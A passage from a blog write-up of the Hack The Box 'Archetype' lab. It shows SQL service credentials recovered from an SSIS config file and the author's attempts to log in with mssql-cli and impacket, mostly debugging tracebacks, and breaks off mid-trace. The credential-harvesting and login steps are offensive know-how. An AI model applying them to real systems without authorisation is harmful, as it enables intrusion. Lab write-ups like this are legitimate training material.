style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">20.1.201</span><br></span><span class="token-line" style="color:#393A34"><span class="token tag attr-value" style="color:#e3116c">9 10:01:34</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">/&gt;</span><span class="token plain">                                                                                                                          </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">DTSConfigurationHeading</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">Configuration</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">ConfiguredType</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">Property</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">Path</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">\Package.Connections[Destination].Properties[ConnectionString]</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">ValueType</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag attr-value" style="color:#e3116c">String</span><span class="token tag attr-value punctuation" style="color:#393A34">"</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Pers</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ist Security Info=True;Auto Translate=False;</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                         </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">Configuration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">                                                                                                                   </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">DTSConfiguration</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Looks like we got some valuable information in this XML file. We can see in the <code>ConfiguredData</code> node that we have credentials which seem to belong to the SQL Server service:</p>
<div class="language-markup codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-markup codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">...;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;...</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">ConfiguredValue</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>We know from the initial scan that there’s an SQL Server running on the machine and we now have credentials to access it.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="connecting-to-sql-server">Connecting to SQL Server<a href="https://kbbgl.github.io/blog/hack-the-box-archetype-challenge#connecting-to-sql-server" class="hash-link" aria-label="Direct link to Connecting to SQL Server" title="Direct link to Connecting to SQL Server">​</a></h2>
<p>In order to start working on SQL Server, I needed a client to connect to it and execute some commands there.
I found <a href="https://github.com/dbcli/mssql-cli" target="_blank" rel="noopener noreferrer"><code>dbcli/mssql-cli</code></a>. I installed it using the <code>pip</code> Python package manager and then attempted connecting to the MSSQL service using the credentials we found earlier:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip3 </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> mssql-cli</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mssql-cli </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$username</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Error message: Login failed </span><span class="token keyword" style="color:#00009f">for</span><span class="token plain"> user </span><span class="token string" style="color:#e3116c">'ARCHETYPE/sql_svc'</span><span class="token builtin class-name">.</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>To get some more information about the login failure, I needed to look at the logic within the <code>mssqlcli</code> main module. I found it by searching the filesystem:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">sudo</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">find</span><span class="token plain"> / </span><span class="token parameter variable" style="color:#36acaa">-wholename</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"*mssqlcli/main.py"</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">2</span><span class="token operator" style="color:#393A34">&amp;&gt;</span><span class="token plain"> /dev/null</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">~/.local/lib/python3.8/site-packages/mssqlcli/main.py</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I managed to find a way to increase the verbosity so I have more information about the source of the error by using the <code>--enable-sqltoolsservice-logging</code> command line option. This revealed a <code>NullReference</code> exception thrown from some C# logger class (which is likely a red-haring) and another exception coming from MSSQL connection service:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssql-cli </span><span class="token parameter variable" style="color:#36acaa">-S</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-U</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$username</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-P</span><span class="token plain"> </span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain"> --enable-sqltoolsservice-logging</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Unhandled Exception: System.NullReferenceException: Object reference not </span><span class="token builtin class-name">set</span><span class="token plain"> to an instance of an object.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   at Microsoft.SqlTools.Utility.Logger.Close</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> D:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">src</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft.SqlTools.Hosting</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Utility</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Logger.cs:line </span><span class="token number" style="color:#36acaa">79</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   at Microsoft.SqlTools.ServiceLayer.Program.Main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">String</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> args</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> D:</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">\</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">s</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">src</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Microsoft.SqlTools.ServiceLayer</span><span class="token punctuation" style="color:#393A34">\</span><span class="token plain">Program.cs:line </span><span class="token number" style="color:#36acaa">27</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">51</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.json_rpc_client.get_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">self.request_id, self.owner_uri</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">84</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise self.exception_queue.get</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">124</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _listen_for_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.reader.read_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">272</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> read_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token keyword" style="color:#00009f">while</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">not self.needs_more_data or self.read_next_chunk</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">))</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/jsonrpcclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">326</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> read_next_chunk</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    raise EOFError</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">u</span><span class="token string" style="color:#e3116c">'End of stream reached, no output.'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">EOFError: End of stream reached, no output.</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">During handling of the above exception, another exception occurred:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/lib/python3.8/runpy.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">194</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _run_module_as_main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">return</span><span class="token plain"> _run_code</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">code, main_globals, None,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/lib/python3.8/runpy.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">87</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _run_code</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    exec</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">code, run_globals</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/main.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">122</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">module</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    main</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/main.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">115</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> main</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    run_cli_with</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">mssqlcli_options</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/main.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">52</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> run_cli_with</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    mssqlcli.connect_to_database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/mssql_cli.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">278</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> connect_to_database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    owner_uri, error_messages </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self.mssqlcliclient_main.connect_to_database</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">91</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> connect_to_database</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    owner_uri, error_messages </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> self._execute_connection_request_with</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">connection_params</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/mssqlcliclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">180</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> _execute_connection_request_with</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    response </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> connection_request.get_response</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/request.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">67</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> get_response</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token builtin class-name">return</span><span class="token plain"> self.response_error</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">error</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"~/.local/lib/python3.8/site-packages/mssqlcli/jsonrpc/contracts/connectionservice.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">22</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> response_error</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    u</span><span class="token string" style="color:#e3116c">'ownerUri'</span><span class="token builtin class-name">:</span><span class="token plain"> cls.owner_uri,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">AttributeError: </span><span class="token builtin class-name">type</span><span class="token plain"> object </span><span class="token string" style="color:#e3116c">'ConnectionRequest'</span><span class="token plain"> has no attribute </span><span class="token string" style="color:#e3116c">'owner_uri'</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I decided that I had wasted enough time debugging a third party library when there are so many other out there that do the same operation. After all, I wanted to capture the flag in an efficient as time as possible. Therefore, I decided to try <a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener noreferrer"><code>impacket</code></a>.
Installation was done using <code>pip</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">pip </span><span class="token function" style="color:#d73a49">install</span><span class="token plain"> impacket</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>And used the documentation to run the following command to connect to SQL Server but I received some unknown error which seemed to originate from switching to TLS:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">-</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">'SSL routines'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'state_machine'</span><span class="token plain">, </span><span class="token string" style="color:#e3116c">'internal error'</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">]</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>I found that I could get more information by specifying the <code>-debug</code> flag which provided the stacktrace:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mssqlclient.py </span><span class="token variable" style="color:#36acaa">$username</span><span class="token builtin class-name">:</span><span class="token variable" style="color:#36acaa">$password</span><span class="token plain">@</span><span class="token variable" style="color:#36acaa">$ip</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-debug</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Impacket v0.9.22.dev1+20200513.101403.9a4b3f52 - Copyright </span><span class="token number" style="color:#36acaa">2020</span><span class="token plain"> SecureAuth Corporation</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Impacket Library Installation Path: /usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/impacket</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Password:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">*</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Encryption required, switching to TLS</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">+</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> Exception:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Traceback </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">most recent call last</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">:</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  File </span><span class="token string" style="color:#e3116c">"/usr/local/lib/python3.8/dist-packages/impacket-0.9.22.dev1+20200513.101403.9a4b3f52-py3.8.egg/EGG-INFO/scripts/mssqlclient.py"</span><span class="token plain">, line </span><span class="token number" style="color:#36acaa">179</span><span class="token plain">, </span><span class="token keyword" style="color:#00009f">in</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">module</span><span class="token operator" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    res </span><span class="token operator" 